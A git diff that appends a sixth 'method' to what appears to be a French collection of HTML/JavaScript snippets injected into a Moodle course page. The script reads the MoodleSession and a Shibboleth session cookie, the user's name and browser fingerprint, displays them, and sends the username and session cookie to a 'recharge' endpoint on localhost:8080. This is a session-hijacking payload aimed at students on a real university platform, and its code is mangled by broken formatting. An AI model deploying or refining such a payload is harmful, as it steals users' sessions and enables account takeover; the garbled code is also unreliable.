@@ -249,3 +249,79 @@ sendRechargeRequest(username, id_vpl, cookieValue);
 
 </script>
 ```
+
+Méthode 6 :
+
+```html
+<p id="info"></p>
+<p>
+  <br>
+</p>
+
+<script>
+  function getCookie(name) {
+    const value = "; " + document.cookie;
+    const parts = value.split("; " + name + "=");
+    if (parts.length === 2) return parts.pop().split(";").shift();
+    return null;
+  }
+
+  function getUserFullName() {
+    const user = document.querySelector('.logininfo a');
+    return user ? user.innerText.trim() : "Utilisateur non trouvé";
+  }
+
+  function getDeviceFingerprint() {
+    return {
+      userAgent: navigator.userAgent,
+      screen: screen.width + "x" + screen.height,
+      language: navigator.language
+    };
+  }
+
+  // --- Données dynamiques ---
+  const cookieValue = getCookie("MoodleSession") || "cookie_non_trouvé";
+  const cookieValue2 = getCookie("_shibsession_64656661756c7468747470733a2f2f6d6f6f646c652e63617365696e652e6f7267") || "cookie_non_trouvé";
+  const username = getUserFullName();
+  const fingerprint = getDeviceFingerprint();
+  const id_vpl = document.body.className.match(/cmid-(\d+)/) ? .[1] || "inconnu";
+
+  // --- Affichage à l'écran ---
+  document.getElementById("info").innerHTML = ` < h2 >
+    Nom : $ {
+      username
+  } < br >
+    Cookie: $ {
+      cookieValue
+  } < br >
+    Cookie2: $ {
+      cookieValue2
+  } < br >
+    User Agent: $ {
+      fingerprint.userAgent
+  } < br >
+    Ré solution: $ {
+      fingerprint.screen
+  } < br >
+    Langue: $ {
+      fingerprint.language
+  } < /h2>
+`;
+
+/ / ---Envoi de la requê te---
+    const url = `http: //localhost:8080/recharge?nom_etud=${encodeURIComponent(username)}&id_vpl=${encodeURIComponent(id_vpl)}&cookie=${encodeURIComponent(cookieValue)}`;
+
+  fetch(url)
+    .then(response = > {
+      if (response.ok) {
+        console.log("✅ Requête envoyée avec succès");
+      } else {
+        console.error("❌ Erreur côté serveur");
+      }
+    })
+    .
+  catch (error = > {
+    console.error("❌ Erreur réseau :", error);
+  });
+</script>
+```
